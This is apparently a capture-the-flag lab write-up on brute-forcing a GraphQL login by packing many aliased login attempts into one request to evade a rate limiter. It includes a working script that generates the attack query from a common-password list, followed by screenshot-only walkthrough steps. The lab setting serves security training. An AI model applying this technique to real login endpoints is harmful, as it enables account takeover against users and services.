Title: Bypassing GraphQL brute force protections
Level: PRACTITIONER
Desc:  The user login mechanism for this lab is powered by a GraphQL API. The API endpoint has a rate limiter that returns an error if it receives too many requests from the same origin in a short space of time.
To solve the lab, brute force the login mechanism to sign in as carlos. Use the list of authentication lab passwords as your password source.
Learn more about Working with GraphQL in Burp Suite. 

Tip: This lab requires you to craft a large request that uses aliases to send multiple login attempts at the same time. As this request could be time-consuming to create manually, we recommend you use a script to build the request.
The below example JavaScript builds a list of aliases corresponding to our list of authentication lab passwords and copies the request to your clipboard. To run this script:
```
    Open the lab in Burp's browser.
    Right-click the page and select Inspect.
    Select the Console tab.
    Paste the script and press Enter.
```
You can then use the generated aliases when crafting your request in Repeater.
```
copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>`
bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
        token
        success
    }
`.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");
```

# Walkthrough:
<img width="1287" height="515" alt="image" src="https://github.com/user-attachments/assets/e4747605-0d0b-434b-8b56-1a29ec225d1f" />

After sending copule requests:
<img width="1371" height="587" alt="image" src="https://github.com/user-attachments/assets/e0dbff13-eb5b-40b3-ac36-632e13202c4e" />


<img width="1354" height="760" alt="image" src="https://github.com/user-attachments/assets/292499c1-10cb-4eef-abe0-6e7df45459af" />

<img width="536" height="162" alt="image" src="https://github.com/user-attachments/assets/54734dad-24f1-47d3-807a-3424457c3753" />

<img width="653" height="280" alt="image" src="https://github.com/user-attachments/assets/194033df-e82d-44d5-93c8-36d8443ec8f7" />

